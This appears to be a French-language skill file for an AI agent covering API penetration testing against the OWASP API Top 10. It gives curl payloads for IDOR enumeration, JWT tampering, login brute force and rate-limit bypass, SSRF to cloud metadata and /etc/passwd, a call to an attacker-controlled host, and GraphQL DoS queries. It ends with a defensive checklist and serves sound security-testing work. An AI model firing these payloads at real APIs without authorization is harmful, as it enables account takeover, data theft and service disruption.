---
name: api-security
description: Expert securite des APIs - OWASP API Top 10, REST, GraphQL
---

# API Security Testing

Tu es expert en **securite des APIs** (REST, GraphQL).

## Mission

> Tester les APIs pour les vulnerabilites specifiques aux interfaces programmatiques.

## OWASP API Security Top 10 (2023)

| # | Vulnerabilite | Description |
|---|---------------|-------------|
| API1 | Broken Object Level Authorization | IDOR sur objets |
| API2 | Broken Authentication | Auth defaillante |
| API3 | Broken Object Property Level Auth | Acces aux proprietes |
| API4 | Unrestricted Resource Consumption | DoS, rate limiting |
| API5 | Broken Function Level Authorization | Acces aux fonctions |
| API6 | Unrestricted Access to Sensitive Flows | Business logic abuse |
| API7 | Server Side Request Forgery | SSRF |
| API8 | Security Misconfiguration | Config faible |
| API9 | Improper Inventory Management | Shadow APIs |
| API10 | Unsafe Consumption of APIs | Third-party APIs |

## API1: Broken Object Level Authorization

```bash
# Test BOLA (IDOR)
# Lister ses propres ressources
curl -H "Authorization: Bearer $TOKEN_USER_A" \
  https://api.example.com/users/123/orders

# Tenter d'acceder aux ressources d'un autre user
curl -H "Authorization: Bearer $TOKEN_USER_A" \
  https://api.example.com/users/456/orders

# Enumeration d'IDs
for id in {1..1000}; do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://api.example.com/users/$id" | grep -q "name" && echo "Found: $id"
done
```

## API2: Broken Authentication

```bash
# JWT sans verification signature
# 1. Decoder le JWT
echo $JWT | cut -d. -f2 | base64 -d

# 2. Modifier le payload (changer user_id, role)
# 3. Encoder sans signature valide (alg: none)

# Brute force avec rate limit bypass
# Tester X-Forwarded-For
curl -X POST -H "X-Forwarded-For: 1.2.3.4" \
  -d '{"email": "admin@example.com", "password": "test"}' \
  https://api.example.com/auth/login

# Token dans URL (leak via referer)
curl -I "https://api.example.com/data?token=abc123" | grep -i referer
```

## API3: Broken Object Property Level Auth

```bash
# Mass Assignment
# Tenter d'ajouter des champs non-autorises
curl -X PATCH -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "John", "role": "admin", "verified": true}' \
  https://api.example.com/users/me

# Excessive Data Exposure
# Verifier les reponses pour donnees sensibles
curl -H "Authorization: Bearer $TOKEN" \
  https://api.example.com/users/me | jq .
# Contient-il passwordHash, internalId, etc. ?
```

## API4: Unrestricted Resource Consumption

```bash
# Rate limiting
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    https://api.example.com/search?q=test
done | sort | uniq -c

# Resource exhaustion
# Pagination sans limite
curl "https://api.example.com/items?limit=999999"

# GraphQL complexity
curl -X POST -d '{"query": "{users{friends{friends{friends{name}}}}}"}' \
  https://api.example.com/graphql
```

## API5: Broken Function Level Authorization

```bash
# Acces aux endpoints admin
curl -H "Authorization: Bearer $USER_TOKEN" \
  https://api.example.com/admin/users

# Changement de methode HTTP
curl -X DELETE -H "Authorization: Bearer $USER_TOKEN" \
  https://api.example.com/users/123

# Endpoints non-documentes
# Fuzzer les paths
ffuf -w /usr/share/wordlists/api-paths.txt \
  -u https://api.example.com/FUZZ \
  -H "Authorization: Bearer $TOKEN"
```

## API6: Unrestricted Access to Sensitive Flows

```bash
# Abus de flow business
# Ex: Coupon illimite
for i in {1..10}; do
  curl -X POST -d '{"coupon": "DISCOUNT50"}' \
    https://api.example.com/checkout
done

# Password reset abuse
curl -X POST -d '{"email": "victim@example.com"}' \
  https://api.example.com/password-reset
# Puis enumerer les tokens
```

## API7: Server Side Request Forgery

```bash
# SSRF via webhook
curl -X POST -d '{"webhook_url": "http://169.254.169.254/latest/meta-data/"}' \
  https://api.example.com/webhooks

# SSRF via file import
curl -X POST -d '{"url": "file:///etc/passwd"}' \
  https://api.example.com/import

# DNS rebinding
curl -X POST -d '{"url": "http://attacker-controlled.com"}' \
  https://api.example.com/fetch
```

## GraphQL Specific

```bash
# Introspection query
curl -X POST -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name fields{name}}}}"}' \
  https://api.example.com/graphql

# Batching attacks
curl -X POST -H "Content-Type: application/json" \
  -d '[{"query": "mutation{login(user:\"admin\",pass:\"test1\")}"},
       {"query": "mutation{login(user:\"admin\",pass:\"test2\")}"}]' \
  https://api.example.com/graphql

# Deep nesting DoS
curl -X POST -H "Content-Type: application/json" \
  -d '{"query": "{a{b{c{d{e{f{g{h}}}}}}}}"}' \
  https://api.example.com/graphql
```

## Outils Specialises

| Outil | Usage |
|-------|-------|
| **Postman** | Test manuel, collections |
| **Insomnia** | Test API, GraphQL |
| **Burp Suite** | Proxy, intruder |
| **OWASP ZAP** | API scan |
| **GraphQL Voyager** | Visualisation schema |
| **Arjun** | Parameter discovery |
| **ffuf** | Fuzzing endpoints |

## Checklist API Security

### Authentication
- [ ] Rate limiting sur login
- [ ] JWT signature verifiee
- [ ] Token expiration courte
- [ ] Refresh token rotation

### Authorization
- [ ] BOLA teste sur tous les endpoints
- [ ] Fonctions admin protegees
- [ ] Mass assignment bloque

### Data
- [ ] Pas de donnees sensibles dans reponses
- [ ] Pagination implementee
- [ ] Input validation

### Config
- [ ] CORS restrictif
- [ ] Headers de securite
- [ ] Pas d'endpoints debug
- [ ] Introspection GraphQL desactivee en prod

## Voir Aussi

- `penetration/owasp-top10` pour web general
- `secure-coding/authorization` pour implementation
- `appsec/dast` pour scan automatise
